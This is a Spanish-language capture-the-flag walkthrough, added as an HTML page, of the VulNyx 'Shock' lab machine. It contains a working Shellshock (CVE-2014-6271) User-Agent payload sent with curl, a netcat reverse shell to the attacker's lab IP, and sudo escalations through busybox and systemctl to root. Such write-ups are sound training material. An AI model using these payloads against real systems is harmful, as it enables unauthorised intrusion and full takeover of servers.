@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>    
+    <meta property="og:title" content="✍ VulNyx - Shock  " />
+    <meta property="og:description" content="🧠 Creador - mowree " />
+    
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/shock" />
+    <meta property="og:url" content="https://0x-noname.github.io/writeups/nyx" /> 
+    
+    <meta property="og:image" content="https://0x-noname.github.io/assets/img/nyx_shock/logo.png" />
+    <meta property="og:type" content="website" />
+    <meta charset="UTF-8"> 
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta property="twitter:image" content="https://0x-noname.github.io/assets/img/nyx_shock/logo.png" />
+    <meta property="twitter:title" content="VulNyx - Shock " />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VulNyx - Shock</title>
+    <link rel="shortcut icon" href="../../assets/img/favicon.ico">
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
+    <link rel="stylesheet"
+      href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
+    <link rel="stylesheet" href="../../assets/css/nyx_w.css">  
+</head>
+<body>
+    <header>
+        <nav class="nav">
+            <a href="../../index">$ home</a>
+            <a href="/#">$ whoami</a>
+        </nav>
+    </header>
+    <main class="main">
+        <h1>Pentesting & Ctf Pl4yer</h1>
+        <h2>VulNyx - Shock</h2>
+            <p class="autor">Autor:&nbsp;<code class="code_autor_nyx">mowree</code></p>
+            <img class="img_nyx" src="../../assets/img/nyx_shock/logo.png" alt="logo">
+            <h3>Escaneo de puertos</h3>
+            <pre class="pre__nyx">
+<code class="code language-txt">❯ nmap -p- -T5 -v -n 192.168.1.14
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre>
+            <h3>Escaneo de servicios</h3>
+<pre class="pre__nyx">
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.14
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3736603e26ae233fe18b5d18e7a7c7ce (RSA)
+|   256 349a57607d6670d5b5ff4796e0362375 (ECDSA)
+|_  256 ae7deefe1dbc994d54453d6116f86c87 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+            <h3>HTTP</h3>
+            <img class="img_b" src="../../assets/img/nyx_shock/http.png" alt="http">              
+            <p>Después de enumerar sin encontrar nada lanzo wfuzz poniendo una barra al final<code class="code_negrita">&nbsp;/&nbsp;</code>para que vuelva a escanear sin saltarse ninguna<code class="code_negrita">&nbsp;ruta&nbsp;</code>. A veces puede pasar que sino pones la barra final no te encuentra algunas rutas.</p>
+<pre class="pre__nyx">
+<code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 --hw=1 -w /usr/share/seclists/Discovery/Web-Content/common.txt "http://192.168.1.14/FUZZ/"
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+    
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+      
+000001038:   403        9 L      28 W       277 Ch      "cgi-bin/"                                                      
+000003710:   403        9 L      28 W       277 Ch      "server-status"
+</code></pre>
+            <p>La carpeta<code class="code_negrita">&nbsp;cgi-bin&nbsp;</code>es una carpeta utilizada para alojar scripts que interactuarán con un navegador web, en esta carpeta se suelen poner archivos .sh, .cgi entre otros, así que hago una búsqueda de extensiones.</p>
+<pre class="pre__nyx">
+<code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 --hw=1 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,sh-cgi "http://192.168.1.14/cgi-bin/FUZZ.FUZ2Z"
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+    
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                            
+=====================================================================
+                                     
+000014961:   500        16 L     77 W       610 Ch      "shell - sh"
+</code></pre>
+
+            
+            <p>Si intento ver el archivo desde firefox veo el siguiente error.</p>
+            <img class="img_b" src="../../assets/img/nyx_shock/internal_server_error.png" alt="internal_server_error"> 
+            <p>Buscando en internet he encontrado este artículo.</p>
+<pre class="pre__nyx">
+<code class="code language-txt">https://github.com/opsxcq/exploit-CVE-2014-6271
+</code></pre>
+            <p>Puedo ejecutar comandos de la siguiente forma:</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'id'" http://192.168.1.14/cgi-bin/shell.sh
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+        </code></pre>
+
+            <p>Como tengo ejecución remota de comandos me mando una shell.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'nc -e /bin/bash 192.168.1.18 1234'" http://192.168.1.14/cgi-bin/shell.sh
+</code></pre>
+
+            <p>Obtengo la shell.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.1.18] from (UNKNOWN) [192.168.1.14] 50850
+script /dev/null -c bash
+Script started, file is /dev/null
+bash-4.3$
+</code></pre>
+
+
+            <p>Compruebo los permisos de sudo.</p>
+<pre class="pre__nyx"><code class="code language-txt">sudo -l
+Matching Defaults entries for www-data on shock:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+    
+User www-data may run the following commands on shock:
+    (will) NOPASSWD: /usr/bin/busybox
+</code></pre>
+
+            <p>Para conseguir pivotar de usuario uso este recurso online<code class="code_negrita">&nbsp;GTFObins&nbsp;</code>.</p>
+<pre class="pre__nyx"><code class="code language-txt">https://gtfobins.github.io/gtfobins/busybox/#sudo
+</code></pre>
+
+            <p>Lanzo el siguiente comando para pivotar al usuario will.</p>
+<pre class="pre__nyx"><code class="code language-txt">sudo -u will /usr/bin/busybox sh
+</code></pre>
+
+            <p>Una vez como como usuario will enumero de nuevo los permisos de sudo.</p>
+<pre class="pre__nyx"><code class="code language-txt">will@shock:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+Matching Defaults entries for will on shock:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+    
+User will may run the following commands on shock:
+    (root) NOPASSWD: /usr/bin/systemctl
+</code></pre>
+
+
+        <p>De nuevo voy a<code class="code_negrita">&nbsp;GTFObins&nbsp;</code>.</p>
+<pre class="pre__nyx"><code class="code language-txt">https://gtfobins.github.io/gtfobins/systemctl/#sudo
+</code></pre>
+
+        <p>Obtengo el root de la siguiente manera.</p>
+<pre class="pre__nyx"><code class="code language-txt">sudo systemctl
+!bash
+root@shock:~# id                                                               
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p></p>
+
+            <p>Y con esto ya tenemos resulta la máquina Shock del sr mowree.</p>
+
+    </main>
+        <footer class="footer">
+            <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
+            <script src="../../assets/highlight/highlight.min.js"></script>
+            <script>hljs.initHighlightingOnLoad();</script> 
+
+        </footer>  
+</body>
+</html>
